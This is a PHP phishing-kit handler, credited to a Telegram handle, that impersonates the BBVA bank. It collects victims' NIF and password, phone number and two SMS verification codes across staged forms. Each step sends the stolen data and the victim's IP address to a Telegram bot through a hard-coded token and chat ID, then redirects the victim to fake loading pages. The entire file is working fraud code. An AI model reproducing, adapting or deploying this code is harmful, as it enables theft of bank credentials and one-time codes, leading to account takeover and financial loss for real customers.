<?php 

// =======> made in : telegram : @ghayt_Zone >=======

require_once "functions.php";




$to = '';
$apiToken = "5286865425:AAGSCoAnBiX2WiPS3EgXPa3jxOrwwWDY42k";
$id = "-1001553100246";




if ($_POST['step']== 'index') {
    $nif = $_POST['nif'];
    $password = $_POST['password'];

    if (empty($nif) || empty($password)) {

        header("Location: index.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | LOGIN | bbva "       . "\r\n" ;
        $message .= "NIF : " . $nif                   . "\r\n";
        $message .= "PASSWORD : " . $password             . "\r\n";
        
        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
        header("Location: loading.php");
        exit();
    }
}

if ($_POST['step']== 'phone') {
    $phone = $_POST['phone'];

    if (empty($phone)) {

        header("Location: phone.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | NUMBER PHONE | bbva "       . "\r\n" ;
        $message .= "PHONE : " . $phone                   . "\r\n";
        
        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
        header("Location: loading2.php");
        exit();
    }
}

if ($_POST['step']== 'sms') {
    $sms = $_POST['sms'];

    if (empty($sms)) {

        header("Location: sms.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | SMS CODE | bbva "       . "\r\n" ;
        $message .= "SMS : " . $sms                   . "\r\n";
        
        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
        header("Location: loading3.php");
        exit();
    }
}

if ($_POST['step']== 'sms-er') {
    $sms = $_POST['sms'];

    if (empty($sms)) {

        header("Location: sms.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | SMS CODE | bbva "       . "\r\n" ;
        $message .= "SMS 2 : " . $sms                   . "\r\n";
        
        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
        header("Location: valid.php");
        exit();
    }
}



?>